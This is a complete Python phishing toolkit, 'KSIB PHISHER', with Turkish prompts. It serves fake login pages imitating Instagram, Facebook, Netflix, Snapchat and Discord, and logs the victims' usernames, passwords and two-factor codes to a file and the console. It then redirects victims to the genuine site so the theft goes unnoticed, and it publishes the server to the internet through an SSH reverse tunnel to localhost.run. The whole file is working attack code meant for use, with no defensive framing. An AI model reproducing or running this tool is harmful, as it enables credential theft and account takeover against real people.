#!/usr/bin/env python3
# KSIB PHISHER - SADECE localhost.run (iSH ÇALIŞAN)
import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket, re, string
from http.cookies import SimpleCookie
from urllib.parse import parse_qs, urlparse

PASSWORD = os.environ.get("PHISHER_PASSWORD", "admiral71100daphne")
MAX_ATTEMPTS = 5
SESSION_TIMEOUT = 1800
NO_2FA = {"netflix", "snapchat", "discord"}
LOG_FILE = "log.jsonl"

SITES = {
    "instagram": ("Instagram", "https://www.instagram.com/accounts/login/"),
    "facebook": ("Facebook", "https://www.facebook.com/login/"),
    "netflix": ("Netflix", "https://www.netflix.com/login"),
    "snapchat": ("Snapchat", "https://accounts.snapchat.com/"),
    "discord": ("Discord", "https://discord.com/login"),
}

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.ip_fails = {}
        self.lock = threading.Lock()
        threading.Thread(target=self._cleanup_loop, daemon=True).start()
    def _cleanup_loop(self):
        while True: time.sleep(300); self.cleanup()
    def create(self, ip, ua, site):
        sid = str(uuid.uuid4())
        with self.lock: self.sessions[sid] = {"id": sid, "ip": ip, "ua": ua, "site": site, "created": time.time(), "stage": "login", "attempts": 0}
        return sid
    def get(self, sid):
        if not sid: return None
        try: uuid.UUID(sid)
        except: return None
        with self.lock:
            s = self.sessions.get(sid)
            if s and time.time() - s["created"] > SESSION_TIMEOUT: self._clean_session(sid); return None
            return s
    def update(self, sid, **kw):
        with self.lock:
            if sid in self.sessions: self.sessions[sid].update(kw)
    def fail(self, sid):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid]["attempts"] += 1
                self.ip_fails.setdefault(self.sessions[sid]["ip"], []).append(time.time())
    def delete(self, sid):
        with self.lock: self._clean_session(sid)
    def _clean_session(self, sid):
        if sid in self.sessions:
            ip = self.sessions[sid]["ip"]
            if ip in self.ip_fails: del self.ip_fails[ip]
            del self.sessions[sid]
    def blocked(self, sid):
        s = self.get(sid)
        if not s: return False
        if s["attempts"] >= MAX_ATTEMPTS: return True
        return len([t for t in self.ip_fails.get(s["ip"], []) if time.time() - t < 60]) > 20
    def cleanup(self):
        now = time.time()
        with self.lock:
            for sid in list(self.sessions):
                if now - self.sessions[sid]["created"] > SESSION_TIMEOUT: self._clean_session(sid)
            for ip in list(self.ip_fails):
                self.ip_fails[ip] = [t for t in self.ip_fails[ip] if now - t < 60]
                if not self.ip_fails[ip]: del self.ip_fails[ip]

class Captcha:
    def __init__(self): self.answers = {}; self.lock = threading.Lock()
    def new(self, sid):
        a, b = random.randint(1,50), random.randint(1,50); op = random.choice('+-*')
        ans = str(a+b if op=='+' else a-b if op=='-' else a*b)
        with self.lock: self.answers[sid] = ans
        return f"{a} {op} {b} = ?"
    def check(self, sid, a):
        if not a: return False
        with self.lock: return self.answers.pop(sid, None) == str(a)

class Logger:
    def __init__(self): self.lock = threading.Lock()
    def log(self, s, stage, data=None):
        d = {k: v for k, v in (data or {}).items()}
        entry = {"t": time.ctime(), "sid": s["id"][:8], "ip": s["ip"], "site": SITES.get(s["site"], ("?"))[0], "stage": stage, "data": d}
        with self.lock: open(LOG_FILE, "a").write(json.dumps(entry, ensure_ascii=False) + "\n")
        if d: print(f"\n🔑 [{stage.upper()}] IP:{s['ip']} | {' | '.join(f'{k}={v}' for k,v in d.items())}")

CSS = """<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;background:#fafafa}
.card{width:100%;max-width:380px;background:#fff;padding:40px 30px;text-align:center;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);border:1px solid #dbdbdb}
h1{font-size:24px;margin-bottom:5px}.sub{color:#666;font-size:14px;margin-bottom:25px}
input{width:100%;padding:14px;margin:8px 0;border:2px solid #eee;border-radius:8px;font-size:15px}input:focus{border-color:#0095f6;outline:none}
button{width:100%;padding:14px;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0;background:#0095f6}
.captcha{padding:15px;margin:10px 0;border-radius:8px;font-size:18px;font-weight:bold;text-align:center;background:#f5f5f5}
a{font-size:13px;text-decoration:none;display:block;margin:10px 0;color:#385185}.error{color:red;font-size:14px;margin:10px 0}</style>"""

def get_template(site, captcha_q, error_msg="", custom_path=""):
    p = custom_path.strip("/")
    action = f"/{p}/login" if p else "/login"
    err = f'<div class="error">{error_msg}</div>' if error_msg else ""
    T = {
        "instagram": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>{CSS}</head><body><div class="card"><div style="font-size:40px;margin-bottom:25px">📷 Instagram</div>{err}<form method="POST" action="{action}"><input name="username" placeholder="Kullanici adi veya e-posta" required><input name="password" type="password" placeholder="Sifre" required><div class="captcha">🛡️ {captcha_q}</div><input name="captcha" placeholder="Cevap" required><button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
        "facebook": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook</title>{CSS}</head><body><div class="card"><h1 style="color:#1877f2;font-size:35px">facebook</h1><div class="sub">Facebook hesabina giris yap</div>{err}<form method="POST" action="{action}"><input name="email" placeholder="E-posta veya telefon" required><input name="pass" type="password" placeholder="Sifre" required><div class="captcha">🛡️ {captcha_q}</div><input name="captcha" placeholder="Cevap" required><button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
        "discord": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord</title>{CSS}body{{background:#36393f}}.card{{background:#2f3136;color:#fff;max-width:480px;text-align:left}}h1{{color:#fff;text-align:center}}.sub{{color:#b9bbbe;text-align:center}}label{{color:#b9bbbe;font-size:12px;font-weight:bold;text-transform:uppercase;display:block;margin-top:15px}}input{{background:#202225;border:1px solid #040405;color:#fff}}input:focus{{border-color:#5865f2}}button{{background:#5865f2}}a{{color:#5865f2;text-align:center}}</head><body><div class="card"><div style="text-align:center;font-size:40px;margin-bottom:20px">🎮</div><h1>Hos geldin!</h1><div class="sub">Discord'a tekrar hos geldin!</div>{err}<form method="POST" action="{action}"><label>E-POSTA VEYA TELEFON</label><input name="email" required><label>SIFRE</label><input name="password" type="password" required><div class="captcha" style="background:#202225;color:#fff;text-align:center">🛡️ {captcha_q}</div><input name="captcha" placeholder="Cevap" style="background:#202225;border:1px solid #040405;color:#fff" required><button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
        "netflix": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Netflix</title>{CSS}body{{background:#000}}.card{{background:rgba(0,0,0,0.75);color:#fff}}h1{{color:#fff}}.sub{{color:#b3b3b3}}input{{background:#333;border:none;color:#fff}}input:focus{{background:#454545}}button{{background:#e50914}}a{{color:#b3b3b3}}</head><body><div class="card"><h1>Oturum Ac</h1><div class="sub">Netflix izlemeye devam et</div>{err}<form method="POST" action="{action}"><input name="email" placeholder="E-posta veya telefon" required><input name="password" type="password" placeholder="Sifre" required><div class="captcha" style="background:#333;color:#fff">🛡️ {captcha_q}</div><input name="captcha" placeholder="Cevap" style="background:#333;border:none;color:#fff" required><button type="submit">Oturum Ac</button></form></div></body></html>""",
        "snapchat": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Snapchat</title>{CSS}body{{background:#FFFC00}}.card{{border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.2)}}h1{{color:#000}}button{{background:#000;color:#FFFC00;border-radius:12px}}a{{color:#000}}</head><body><div class="card"><div style="font-size:50px;margin-bottom:10px">👻</div><h1>Snapchat</h1><div class="sub">Giris Yap</div>{err}<form method="POST" action="{action}"><input name="email" placeholder="E-posta veya kullanici adi" required><input name="password" type="password" placeholder="Sifre" required><div class="captcha" style="background:#FFFDE7">🛡️ {captcha_q}</div><input name="captcha" placeholder="Cevap" required><button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
    }
    return T.get(site, T["instagram"])

def page_2fa(site_name, error=None, custom_path=""):
    err = f'<div class="error">{error}</div>' if error else ""
    p = custom_path.strip("/")
    action = f"/{p}/2fa" if p else "/2fa"
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2FA - {site_name}</title><style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#fafafa;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}}.card{{max-width:350px;width:100%;background:#fff;padding:40px 30px;text-align:center;border-radius:10px;border:1px solid #dbdbdb}}h2{{margin-bottom:10px}}p{{color:#666;font-size:14px;margin-bottom:20px}}input{{width:100%;padding:15px;text-align:center;font-size:24px;border:2px solid #ddd;border-radius:8px;letter-spacing:10px}}input:focus{{border-color:#0095f6;outline:none}}button{{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:20px}}</style></head><body><div class="card"><h2>Iki Adimli Dogrulama</h2><p>{site_name} hesabina giris icin kod gir</p>{err}<form method="POST" action="{action}"><input name="code" placeholder="000000" maxlength="6" required pattern="[0-9]{{6}}" title="6 haneli rakam"><button type="submit">Dogrula</button></form></div></body></html>"""

class CustomTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

class Handler(http.server.SimpleHTTPRequestHandler):
    sessions = SessionManager()
    captcha = Captcha()
    logger = Logger()
    site = "instagram"
    custom_path = ""

    def _ip(self): return self.client_address[0]
    def _sid(self):
        c = SimpleCookie(self.headers.get('Cookie', ''))
        s = c.get('session_id')
        return s.value if s else None
    def _base(self):
        p = self.custom_path.strip("/")
        return f"/{p}" if p else ""
    def _main_page(self, path):
        base = self._base()
        return path in ("/", "/index.html") or (base and path == base)
    def _is_2fa(self, path):
        base = self._base()
        return path == "/2fa" or (base and path == f"{base}/2fa")

    def do_GET(self):
        try:
            path = urlparse(self.path).path
            ip, ua = self._ip(), self.headers.get('User-Agent','?')
            sid = self._sid()
            s = self.sessions.get(sid)
            base = self._base()
            if not s and self._main_page(path):
                sid = self.sessions.create(ip, ua, self.site)
                s = self.sessions.get(sid)
                self._send_html(get_template(self.site, self.captcha.new(sid), "", self.custom_path), sid)
                return
            if not s: self.send_error(404); return
            if self.sessions.blocked(sid): self.send_response(403); self._send_html("<h1>Erisim Engellendi</h1>"); return
            if s.get("stage") == "done": self._redirect(SITES.get(s["site"], SITES["instagram"])[1]); return
            if self._main_page(path):
                err = "Yanlis captcha!" if "error=captcha" in self.path else ""
                self._send_html(get_template(s["site"], self.captcha.new(sid), err, self.custom_path))
            elif self._is_2fa(path) and s.get("stage") == "login_ok":
                err = "Gecersiz kod!" if "error=invalid" in self.path else None
                self._send_html(page_2fa(SITES.get(s["site"], ("Site",))[0], err, self.custom_path))
            elif self._is_2fa(path):
                self._redirect(f"{base}/" if base else "/")
            else: self.send_error(404)
        except (BrokenPipeError, ConnectionResetError, OSError): pass

    def do_POST(self):
        try:
            path = urlparse(self.path).path
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode() if length else ""
            parsed = parse_qs(data) if data else {}
            sid = self._sid()
            s = self.sessions.get(sid)
            base = self._base()
            if not s or self.sessions.blocked(sid): self._redirect(f"{base}/" if base else "/"); return
            login_path = f"{base}/login" if base else "/login"
            if path == login_path:
                if not self.captcha.check(sid, parsed.get("captcha", [""])[0]):
                    self.sessions.fail(sid)
                    self._redirect(f"{base}?error=captcha" if base else "/?error=captcha"); return
                login_data = {k: v[0] for k, v in parsed.items() if k != "captcha"}
                self.sessions.update(sid, login_data=login_data, stage="login_ok")
                self.logger.log(s, "login", login_data)
                if s["site"] in NO_2FA:
                    self.sessions.delete(sid)
                    self._redirect(SITES.get(s["site"], SITES["instagram"])[1])
                else:
                    self._redirect(f"{base}/2fa" if base else "/2fa")
            elif self._is_2fa(path) and s.get("stage") == "login_ok":
                code = parsed.get("code", [""])[0]
                if code and len(code) == 6 and code.isdigit():
                    self.sessions.update(sid, stage="done", code_data={"code": code})
                    self.logger.log(s, "2fa", {"code": code})
                    self.sessions.delete(sid)
                    self._redirect(SITES.get(s["site"], SITES["instagram"])[1])
                else:
                    self._redirect(f"{base}/2fa?error=invalid" if base else "/2fa?error=invalid")
        except (BrokenPipeError, ConnectionResetError, OSError): pass

    def _send_html(self, html, sid=None):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            if sid: self.send_header('Set-Cookie', f'session_id={sid}; Path=/; HttpOnly; Secure; Max-Age={SESSION_TIMEOUT}; SameSite=Lax')
            self.end_headers()
            self.wfile.write(html.encode())
            self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError, OSError): pass

    def _redirect(self, loc):
        try:
            self.send_response(302)
            self.send_header('Location', loc)
            self.end_headers()
        except: pass
    def log_message(self, *args): pass

def localhost_tunnel(port):
    try:
        proc = subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "localhost.run"],
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output = ""
        for _ in range(20):
            time.sleep(1)
            line = proc.stdout.readline() if proc.stdout else ""
            output += line
            match = re.search(r'(https://[a-zA-Z0-9-]+\.(?:lhr\.life|localhost\.run))', output)
            if match: return match.group(0)
        return None
    except: return None

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print("╔══════════════════════════════════╗\n║   🎣 KSIB PHISHER (iSH)        ║\n╚══════════════════════════════════╝")
    for i in range(3):
        if input("Sifre: ") == PASSWORD: break
        print(f"Hatali ({2-i})")
    else: sys.exit(1)
    print("\nSİTELER:")
    keys = list(SITES.keys())
    for i, k in enumerate(keys, 1): print(f"  [{i}] {SITES[k][0]}")
    while True:
        try:
            sec = int(input("\n> ") or "1")
            if 1 <= sec <= len(keys): Handler.site = keys[sec-1]; break
        except ValueError: pass
        print("Geçerli sayı gir!")
    custom = input("\n🔗 Özel yol (boş = standart): ").strip()
    Handler.custom_path = custom if custom else ""
    port = 8080
    while True:
        try:
            p = input(f"Port (8080): ").strip()
            port = int(p) if p else 8080
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("", port)); s.close()
            break
        except ValueError: print("Sayı gir!")
        except OSError: print(f"Port {port} kullanılıyor!")
    print("\n🌐 localhost.run başlatılıyor...")
    tunnel_url = localhost_tunnel(port)
    if not tunnel_url:
        print("❌ Tünel başarısız! iSH: apk add openssh-client"); sys.exit(1)
    print(f"\n{'='*50}\n✅ {SITES[Handler.site][0]}\n🔗 {tunnel_url}")
    print("📝 log.jsonl\n🛑 Ctrl+C\n" + "="*50 + "\n")
    try:
        server = CustomTCPServer(("", port), Handler)
        server.serve_forever()
    except OSError:
        print(f"❌ Port {port} kullanılıyor!"); sys.exit(1)
    except KeyboardInterrupt:
        if 'server' in locals(): server.shutdown(); server.server_close()
        print("\n🛑 Durduruldu!")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\nÇıkış!"); sys.exit(0)
